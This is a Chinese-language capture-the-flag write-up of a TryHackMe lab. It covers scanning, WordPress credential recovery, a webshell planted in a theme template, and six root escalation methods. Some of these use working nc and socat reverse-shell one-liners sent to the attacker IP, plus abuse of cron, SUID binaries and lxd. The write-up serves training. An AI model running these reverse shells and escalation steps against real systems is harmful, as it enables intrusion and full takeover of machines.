#服务发现
```
┌──(root💀kali)-[~/tryhackme/allinone]
└─# nmap -sV -Pn 10.10.167.81     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-28 05:58 EDT
Nmap scan report for 10.10.167.81
Host is up (0.31s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```
#ftp服务枚举
ftp可以匿名登录
无任何文件发现
也不可以上传文件到ftp
用其他用户名登录ftp会提示```This FTP server is anonymous only.```

#爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81                

 _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
(_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-28_05-59-27.log

Target: http://10.10.167.81                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[05:59:28] Starting: 
[05:59:32] 200 -   11KB - /           
[05:59:36] 301 -  316B  - /wordpress  ->  http://10.10.167.81/wordpress/
[05:59:57] 200 -  197B  - /hackathons           
[06:05:57] 403 -  277B  - /server-status                                                                            
                                                                                                                                                                                                
Task Completed     
```



 ```http://10.10.167.81/wordpress/```是一个wordpress站点


#wordpress挖掘
```
┌──(root💀kali)-[~/tryhackme/allinone]
└─# wpscan --url http://10.10.167.81/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://10.10.167.81/wordpress/ [10.10.167.81]
[+] Started: Tue Sep 28 06:20:29 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.167.81/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.167.81/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.167.81/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.167.81/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.167.81/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.167.81/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.167.81/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.167.81/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://10.10.167.81/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.167.81/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.167.81/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.167.81/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.167.81/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.167.81/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.167.81/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep 28 06:20:42 2021
[+] Requests Done: 139
[+] Cached Requests: 40
[+] Data Sent: 37.39 KB
[+] Data Received: 19.909 KB
[+] Memory used: 213.031 MB
```

首页出现一个账号信息：```elyana```。经登陆测试验证是合法账号。确认wordpress版本5.5.1

#爆破wordpress站点目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100 -u http://10.10.167.81/wordpress

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-29_01-44-29.log

Target: http://10.10.167.81/wordpress

[01:44:30] Starting: 
[01:44:35] 301 -  327B  - /wordpress/wp-content  ->  http://10.10.167.81/wordpress/wp-content/
[01:44:39] 301 -  328B  - /wordpress/wp-includes  ->  http://10.10.167.81/wordpress/wp-includes/
[01:44:39] 200 -   28KB - /wordpress/  
[01:45:02] 301 -  325B  - /wordpress/wp-admin  ->  http://10.10.167.81/wordpress/wp-admin/
                                                                                                                                                                                                
Task Completed
```

wp-includes可以看到文件list


#爆破/hackathons，无发现

```http://10.10.167.81/hackathons```里显示了一句话

>Damn how much I hate the smell of Vinegar :/ !!! 

源代码有两行注释
```
Dvc W@iyur@123 
KeepGoing 
```

Vinegar是一种加密算法,中文名叫```维吉尼亚密码```,以下引用自维基百科
>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚所创造，因此现在被称为“维吉尼亚密码”

使用[这个网站](https://cryptii.com/pipes/vigenere-cipher)
```Dvc W@iyur@123 ```是密码串
```KeepGoing``` 是加解密的key
解密以后的明文是：Try H@ckme@123



用```elyana : H@ckme@123```登录wordpress后台

在```theme editer```里找到404.php，把webshell写到模板里，访问一个不存在的页面，触发发弹shell

```
──(root💀kali)-[~/tryhackme/allinone]
└─# nc -lnvp 1234                       
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.167.81] 59420
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:44:14 up  2:10,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
elyana
$ cd elyana
$ ls -alh
total 48K
drwxr-xr-x 6 elyana elyana 4.0K Oct  7  2020 .
drwxr-xr-x 3 root   root   4.0K Oct  5  2020 ..
-rw------- 1 elyana elyana 1.6K Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3.7K Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4.0K Oct  5  2020 .cache
drwxr-x--- 3 root   root   4.0K Oct  5  2020 .config
drwx------ 3 elyana elyana 4.0K Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4.0K Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
$ 
```

没有权限访问user.txt，必须横向提权到elyana的账号


传linpeas到靶机，发现一个root的定时任务有可写权限，可以直接跳过横向提权到root，另外还有几个提权方法，这里一一介绍

#提权方法1：Cron
思路是把一个反弹shell写到cron任务里，开启监听等待任务执行
需要注意这台靶机很多反弹方法都不能使用，需要一一测试
这里用的是```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f```
参考[这里的方法](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

```
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f" >> /var/backups/script.sh
$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f
$ 
```

#开启监听，拿到user和root的flag,需要base64解密
```
┌──(root💀kali)-[~/dirsearch]
└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.167.81] 48544
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /home/elyana/user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
# cat /root/root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
# 
```

#提权方法2 sudo滥用：socat
因为这台机器只安装了python3，所以我们要用python3切换tty

```python3 -c "import pty;pty.spawn('/bin/bash')"```

用find找到elyana相关的文件

```
bash-4.4$  find / -user elyana -type f 2>/dev/null
 find / -user elyana -type f 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
bash-4.4$ cat /etc/mysql/conf.d/private.txt
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght

```

找到ssh凭证：```elyana:E@syR18ght```

我们登陆到elyana的账号，查看elyana的sudo权限
```
┌──(root💀kali)-[~]
└─# ssh elyana@10.10.167.81
elyana@10.10.167.81's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.


Last login: Fri Oct  9 08:09:56 2020
-bash-4.4$ whoami
elyana
-bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat

```

提权
```
-bash-4.4$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```


我们查看linpease枚举的本机的所有SUID,很多都是可以拿来提权的
```
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                     
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount (Unknown SUID binary)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary)
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 root root 11M Nov 23  2018 /usr/bin/lxc (Unknown SUID binary)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 root root 392K Apr  4  2018 /usr/bin/socat
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

```



#提权方法3 SUID：socat

socat同时也是一个SUID,我们依据SUID提权

在攻击机开启监听：
```socat file:`tty`,raw,echo=0 tcp-listen:12345```


在靶机执行：
```sudo /usr/bin/socat tcp-connect:10.13.21.169:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane```

返回root的反弹shell

```
┌──(root💀kali)-[~]
└─# socat file:`tty`,raw,echo=0 tcp-listen:12345
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 

```

#提权方法4 SUID:bash

```
-bash-4.4$ /bin/bash -p
bash-4.4# id
uid=1000(elyana) gid=1000(elyana) euid=0(root) egid=0(root) groups=0(root),4(adm),27(sudo),108(lxd),1000(elyana)
bash-4.4# whoami
root
bash-4.4# 

```

#提权方法5 SUID:chmod
这个命令的思路是通过chmod修改一些敏感文件的权限，使得这些文件可读可写，从而提升自己的权限


```
-bash-4.4$ ls -alh /etc/sudoers
-r--r----- 1 root root 772 Oct  6  2020 /etc/sudoers
-bash-4.4$ /bin/chmod 777 /etc/sudoers
-bash-4.4$ ls -alh /etc/sudoers
-rwxrwxrwx 1 root root 772 Oct  6  2020 /etc/sudoers
-bash-4.4$ /bin/chmod 777 /etc/shadow
-bash-4.4$ ls -alh /etc/shadow
-rwxrwxrwx 1 root shadow 981 Oct  6  2020 /etc/shadow

```

#提权方法6 lxd组用户提权
这个方法的操作流程在之前我的[这台靶机](https://www.jianshu.com/p/d23ae6bba086)里有详细记录

```
bash-4.4$ wget http://10.13.21.169:8000/alpine-v3.8-i686-20210926_2341.tar.gz
--2021-09-29 09:42:52--  http://10.13.21.169:8000/alpine-v3.8-i686-20210926_2341.tar.gz
Connecting to 10.13.21.169:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2684439 (2.6M) [application/gzip]
Saving to: ‘alpine-v3.8-i686-20210926_2341.tar.gz’

alpine-v3.8-i686-20210926_2341.tar.gz                      100%[========================================================================================================================================>]   2.56M   722KB/s    in 3.6s    

2021-09-29 09:42:56 (722 KB/s) - ‘alpine-v3.8-i686-20210926_2341.tar.gz’ saved [2684439/2684439]

bash-4.4$ ls
alpine-v3.8-i686-20210926_2341.tar.gz  p.txt                                                                    systemd-private-cdd8179bf3ba4745b2f268da926b2a33-systemd-resolved.service-qOqtw7
f                                      systemd-private-cdd8179bf3ba4745b2f268da926b2a33-apache2.service-qmXFBf  systemd-private-cdd8179bf3ba4745b2f268da926b2a33-systemd-timesyncd.service-PIgav5
bash-4.4$ lxc image import ./alpine-v3.8-i686-20210926_2341.tar.gz --alias myimage
Image imported with fingerprint: a4b76201ae71d9a5e56acf1263f61546a77a4086779729bb254d47cd24cb6829
bash-4.4$ lxc init myimage ignite -c security.privileged=true
Creating ignite
bash-4.4$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
bash-4.4$  lxc start ignite
bash-4.4$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/
/mnt/root # ls
bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            sys             usr             vmlinuz
boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             tmp             var             vmlinuz.old
/mnt/root # cd root/
/mnt/root/root # pwd
/mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
/mnt/root/root # 
```
这里列出了6种提权的方法，但我感觉应该还有其他方法，这里就不再测试了。如果你知道其他提权的思路，请留言告诉我： )